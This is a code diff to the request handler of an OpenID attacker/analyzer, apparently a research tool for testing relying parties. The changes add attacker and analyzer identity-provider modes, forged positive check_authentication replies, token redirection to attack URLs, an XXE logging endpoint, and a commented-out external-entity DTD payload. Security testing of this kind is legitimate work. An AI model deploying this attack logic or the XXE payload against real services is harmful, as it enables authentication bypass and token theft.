@@ -22,6 +22,7 @@ import wsattacker.sso.openid.attacker.discovery.html.HtmlDiscoveryConfiguration;
 import wsattacker.sso.openid.attacker.log.RequestLogger;
 import wsattacker.sso.openid.attacker.log.RequestType;
 import wsattacker.sso.openid.attacker.log.utilities.PrintHelper;
+import wsattacker.sso.openid.attacker.server.IdpType;
 import wsattacker.sso.openid.attacker.server.exception.OpenIdAttackerServerException;
 import wsattacker.sso.openid.attacker.server.utilities.HttpPostRedirect;
 
@@ -30,10 +31,19 @@ public class CustomOpenIdProviderHandler extends AbstractHandler {
     public static final String PROP_OPENIDPROCESSOR = "openIdProcessor";
     private static final Logger LOG = Logger.getLogger(CustomOpenIdProviderHandler.class.getName());
     private final transient PropertyChangeSupport propertyChangeSupport = new java.beans.PropertyChangeSupport(this);
-    private CustomOpenIdProcessor openIdProcessor = new CustomOpenIdProcessor();
+    private CustomOpenIdProcessor openIdProcessor;
+    private IdpType idpType;
 
     public CustomOpenIdProviderHandler() {
+        this(IdpType.ATTACKER);
+    }
+    
+    public CustomOpenIdProviderHandler(IdpType idpType) {
         super();
+        
+        openIdProcessor = new CustomOpenIdProcessor(idpType);
+        
+        this.idpType = idpType;
     }
 
     /**
@@ -67,6 +77,9 @@ public class CustomOpenIdProviderHandler extends AbstractHandler {
         String xrds = getOpenIdProcessor().processXrdsRequest(info);
         response.setStatus(HttpServletResponse.SC_OK);
         response.setContentType("application/xrds+xml;charset=utf-8");
+        response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+        response.addHeader("Expires", "0");
+        response.addHeader("Pragma", "no-cache");
         response.getWriter().println(xrds);
         LOG.info("--> END handleXrdsRequest");
     }
@@ -81,42 +94,80 @@ public class CustomOpenIdProviderHandler extends AbstractHandler {
         response.setStatus(HttpServletResponse.SC_OK);
         String responseText = openidResponse.keyValueFormEncoding();
         response.getWriter().println(responseText);
-        RequestLogger.getInstance().add(RequestType.ASSOCIATION, shortLog, requestText, responseText);
+        RequestLogger.getInstance().add(RequestType.ASSOCIATION, shortLog, requestText, responseText, idpType);
         LOG.info("--> END handleAssociationRequest");
     }
 
     public void handleTokenRequest(String info, HttpServletResponse response, final ParameterList requestParameter) throws IOException, OpenIdAttackerServerException {
         LOG.info("--> BEGIN handleTokenRequest");
-        handleTokenRequestwithPostRedirect(info, response, requestParameter);
+        
+        // check whether the association handle should be excluded from
+        // Authentication Request => force direct authentication
+        /*if (OpenIdServerConfiguration.getAttackerInstance().isRemoveAssocHandleFromAuthRequest()) {
+            requestParameter.removeParameters("openid.assoc_handle");
+        } */       
+        
+        // check settings for GET or POST redirect
+        if (idpType.equals(IdpType.ANALYZER)) {
+            if (OpenIdServerConfiguration.getAnalyzerInstance().isMethodGet()){
+                handleTokenRequestwithGetRedirect(response, requestParameter);
+            } else {
+                handleTokenRequestWithPostRedirect(info, response, requestParameter);
+            }
+        } else {
+            if (OpenIdServerConfiguration.getAttackerInstance().isMethodGet()){
+                handleTokenRequestwithGetRedirect(response, requestParameter);
+            } else {
+                handleTokenRequestWithPostRedirect(info, response, requestParameter);
+            }
+        }
+        
         LOG.info("--> END handleTokenRequest");
     }
 
-    public void handleTokenRequestwithPostRedirect(String info, HttpServletResponse response, final ParameterList requestParameter) throws OpenIdAttackerServerException, IOException {
+    public void handleTokenRequestWithPostRedirect(String info, HttpServletResponse response, final ParameterList requestParameter) throws OpenIdAttackerServerException, IOException {
         String assoc_handle = requestParameter.getParameterValue("openid.assoc_handle");
         LOG.info(String.format("--> BEGIN handleTokenRequestwithGetRedirect for assoc_handle='%s'",
           assoc_handle != null ? assoc_handle : "<NONE>"));
         AttackParameterKeeper keeper = getOpenIdProcessor().processTokenRequest(requestParameter);
         response.setStatus(HttpServletResponse.SC_OK);
         String destinationUrl = getDestinationUrl(keeper);
-        Map<String, String> getParameters = AttackParameterHandler.createMapByMethod(keeper, HttpMethod.GET);
-        Map<String, String> postParamters = AttackParameterHandler.createMapByMethod(keeper, HttpMethod.POST);
-        String postRedirectHtml = HttpPostRedirect.createPostRedirect(destinationUrl, getParameters, postParamters);
+        
+        boolean performAttack;
+        boolean interceptIdpResponse;
+        if (idpType == IdpType.ATTACKER) {
+            performAttack = OpenIdServerConfiguration.getAttackerInstance().isPerformAttack();
+            interceptIdpResponse = OpenIdServerConfiguration.getAttackerInstance().isInterceptIdPResponse();
+        } else {
+            performAttack = OpenIdServerConfiguration.getAnalyzerInstance().isPerformAttack();
+            interceptIdpResponse = OpenIdServerConfiguration.getAnalyzerInstance().isInterceptIdPResponse();
+        }
+        
+        Map<String, String> getParameters = AttackParameterHandler.createMapByMethod(keeper, HttpMethod.GET, performAttack);
+        Map<String, String> postParamters = AttackParameterHandler.createMapByMethod(keeper, HttpMethod.POST, performAttack);
+        String postRedirectHtml = HttpPostRedirect.createPostRedirect(destinationUrl, getParameters, postParamters, interceptIdpResponse);
         response.getWriter().println(postRedirectHtml);
 
         RequestType type;
-        if (OpenIdServerConfiguration.getInstance().isPerformAttack()) {
+        if (performAttack) {
             type = RequestType.TOKEN_ATTACK;
         } else {
             type = RequestType.TOKEN_VALID;
         }
         String responseText = String.format("GET:\n\n%s\nPOST:\n\n%s", PrintHelper.mapToString(getParameters), PrintHelper.mapToString(postParamters));
-        RequestLogger.getInstance().add(type, "Token generated", info + "\n\n" + requestParameter.toString(), responseText);
+        RequestLogger.getInstance().add(type, "Token generated", info + "\n\n" + requestParameter.toString(), responseText, idpType);
         LOG.info("--> END handleTokenRequestwithGetRedirect");
     }
 
     private String getDestinationUrl(AttackParameterKeeper keeper) {
-        final boolean performAttack = OpenIdServerConfiguration.getInstance().isPerformAttack();
-        final boolean toAttackUrl = OpenIdServerConfiguration.getInstance().isSendTokenToAttackUrl();
+        boolean performAttack = OpenIdServerConfiguration.getAttackerInstance().isPerformAttack();
+        boolean toAttackUrl = OpenIdServerConfiguration.getAttackerInstance().isSendTokenToAttackUrl();
+        
+        if (idpType.equals(IdpType.ANALYZER)) {
+            performAttack = OpenIdServerConfiguration.getAnalyzerInstance().isPerformAttack();
+            toAttackUrl = OpenIdServerConfiguration.getAnalyzerInstance().isSendTokenToAttackUrl();
+        }
+        
         String destinationUrl;
         if (performAttack && toAttackUrl) {
             destinationUrl = keeper.getParameter("openid.return_to").getAttackValue();
@@ -126,17 +177,39 @@ public class CustomOpenIdProviderHandler extends AbstractHandler {
         return destinationUrl;
     }
 
-// NOT SUPPORTED ANY LONGER
-//    public void handleTokenRequestwithGetRedirect(HttpServletResponse response, final ParameterList requestParameter)
-//      throws MessageException, ServerException, AssociationException {
-//        String assoc_handle = requestParameter.getParameterValue("openid.assoc_handle");
-//        LOG.info(String.format("--> BEGIN handleTokenRequestwithPostRedirect for assoc_handle='%s'",
-//          assoc_handle != null ? assoc_handle : "<NONE>"));
-//        Message openidResponse = openIdProcessor.processTokenRequest(requestParameter);
-//        response.setStatus(HttpServletResponse.SC_SEE_OTHER);
-//        response.setHeader("Location", openidResponse.getDestinationUrl(true));
-//        LOG.info("--> END handleTokenRequestwithPostRedirect");
-//    }
+    
+    public void handleTokenRequestwithGetRedirect(HttpServletResponse response, final ParameterList requestParameter)
+      throws OpenIdAttackerServerException {
+        String assoc_handle = requestParameter.getParameterValue("openid.assoc_handle");
+        LOG.info(String.format("--> BEGIN handleTokenRequestwithGetRedirect for assoc_handle='%s'",
+          assoc_handle != null ? assoc_handle : "<NONE>"));
+        AttackParameterKeeper keeper = openIdProcessor.processTokenRequest(requestParameter);
+        response.setStatus(HttpServletResponse.SC_SEE_OTHER);
+        
+        boolean performAttack = false;
+        if (idpType == IdpType.ATTACKER) {
+            performAttack = OpenIdServerConfiguration.getAttackerInstance().isPerformAttack();
+        } else {
+            performAttack = OpenIdServerConfiguration.getAnalyzerInstance().isPerformAttack();
+        }
+        
+        RequestType type;
+        if (performAttack) {
+            type = RequestType.TOKEN_ATTACK;
+        } else {
+            type = RequestType.TOKEN_VALID;
+        }
+        
+        Map<String, String> getParameters = AttackParameterHandler.createMapByMethod(keeper, HttpMethod.GET, performAttack);
+        String location = HttpPostRedirect.createGetRequest(getDestinationUrl(keeper), getParameters);
+        
+        response.setHeader("Location", location);
+        String responseText = String.format("GET:\n\n%s", PrintHelper.mapToString(getParameters));
+        RequestLogger.getInstance().add(type, "Token generated", requestParameter.toString(), responseText, idpType);
+        
+        LOG.info("--> END handleTokenRequestwithGetRedirect");
+    }
+    
     public void handleError(HttpServletResponse response, HttpServletRequest request, final String errorMessage, final int ERROR_CODE) throws IOException {
         LOG.info("--> BEGIN handleError");
         Message openidResponse = DirectError.createDirectError(errorMessage);
@@ -148,7 +221,7 @@ public class CustomOpenIdProviderHandler extends AbstractHandler {
           request.getMethod(),
           request.getRequestURL(),
           new ParameterList(request.getParameterMap()));
-        RequestLogger.getInstance().add(RequestType.ERROR, errorMessage, requestContent, errorMessage);
+        RequestLogger.getInstance().add(RequestType.ERROR, errorMessage, requestContent, errorMessage, idpType);
         LOG.info("--> END handleError");
     }
 
@@ -191,13 +264,20 @@ public class CustomOpenIdProviderHandler extends AbstractHandler {
         final String mode = requestParameter.hasParameter("openid.mode")
           ? requestParameter.getParameterValue("openid.mode") : null;
 
-	    if (uri.getCompletePath().equals("/favicon.ico")) {
+	if (uri.getCompletePath().equals("/favicon.ico")) {
             handleFaviconRequest(info, response);
-        } else if (mode == null) {
+        } else if (target.contains("xxe")) {
+            // Case: XXE
+            handleXxeRequest(info, response, requestParameter);
+        } /*else if (target.contains("dtd")) {
+            // Case: DTD
+            handleDtdRequest(info, response, requestParameter);
+        }*/ else if (mode == null) {
             if (target.contains("xrds") || requestParameter.toString().contains("xrds")) {
                 // Case: Request XRDS Document
-                handleXrdsRequest(info, response);
+                handleXrdsRequest(info, response);                
             } else {
+                // Case: Request HTML Document
                 handleHtmlDiscovery(info, response);
             }
         } else if ("associate".equals(mode)) {
@@ -213,6 +293,29 @@ public class CustomOpenIdProviderHandler extends AbstractHandler {
         }
         baseRequest.setHandled(true);
     }
+    
+    private void handleXxeRequest(String info, HttpServletResponse response, final ParameterList requestParameter) throws IOException {
+        LOG.info("--> BEGIN handleXxeRequest");
+        String requestText = String.format("%s\n\n%s", info, requestParameter.toString());
+        response.setStatus(HttpServletResponse.SC_OK);
+        String responseText = "http://rub.de";
+        response.getWriter().print(responseText);
+        RequestLogger.getInstance().add(RequestType.XXE, "XXE", requestText, responseText, idpType);
+        LOG.info("--> END handleXxeRequest");
+    }
+    
+    /*private void handleDtdRequest(String info, HttpServletResponse response, final ParameterList requestParameter) throws IOException {
+        LOG.info("--> BEGIN handleDtdRequest");
+        String requestText = String.format("%s\n\n%s", info, requestParameter.toString());
+        response.setStatus(HttpServletResponse.SC_OK);
+        String responseText = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
+                              "<!ENTITY % xxe SYSTEM \"http://my-idp.info/xxe\">\n" +
+                              "%xxe;";
+        response.getWriter().println(responseText);
+        System.out.println("dtd");
+        //RequestLogger.getAttackerInstance().add(RequestType.XXE, "XXE", requestText, responseText);
+        LOG.info("--> END handleDtdRequest");
+    }*/
 
     private void handleCheckAuthentication(String info, HttpServletResponse response, final ParameterList requestParameter) throws IOException {
 
@@ -220,12 +323,18 @@ public class CustomOpenIdProviderHandler extends AbstractHandler {
         String assocHandle = requestParameter.getParameterValue("openid.assoc_handle");
         String shortLog = String.format("Returning check_authentication = true for %s", assocHandle);
         LOG.info(String.format("    --> assoc_handle = %s", assocHandle));
-        Message responseMessage = getOpenIdProcessor().generatePositiveCheckAuthenticationResponse();
+        
+        Message responseMessage;
+        if (idpType.equals(IdpType.ATTACKER)) {
+            responseMessage = getOpenIdProcessor().generatePositiveCheckAuthenticationResponse();
+        } else {
+            responseMessage = getOpenIdProcessor().generateCorrectCheckAuthenticationResponse(requestParameter);
+        }
         String responseText = responseMessage.keyValueFormEncoding();
         response.getWriter().println(responseText);
         response.setStatus(HttpServletResponse.SC_OK);
         String requestText = String.format("%s\n\n%s", info, requestParameter.toString());
-        RequestLogger.getInstance().add(RequestType.CHECK_AUTHENTICATION, shortLog, requestText, responseText);
+        RequestLogger.getInstance().add(RequestType.CHECK_AUTHENTICATION, shortLog, requestText, responseText, idpType);
         LOG.info("--> END handleCheckAuthentication");
     }
 
@@ -236,10 +345,13 @@ public class CustomOpenIdProviderHandler extends AbstractHandler {
         final HtmlDiscoveryConfiguration htmlConfiguration = p.getHtmlConfiguration();
         if (htmlConfiguration.isIncludeXrdsHttpHeader()) {
             final String identity = htmlConfiguration.getIdentity();
-            response.addHeader("X-XRDS-Location", identity);
+            response.addHeader("X-XRDS-Location", identity + "?xrds");
         }
         response.setStatus(HttpServletResponse.SC_OK);
         response.setContentType("text/html;charset=utf-8");
+        response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+        response.addHeader("Expires", "0");
+        response.addHeader("Pragma", "no-cache");
         response.getWriter().println(xrds);
         LOG.info("--> END handleHtmlDiscovery");
     }
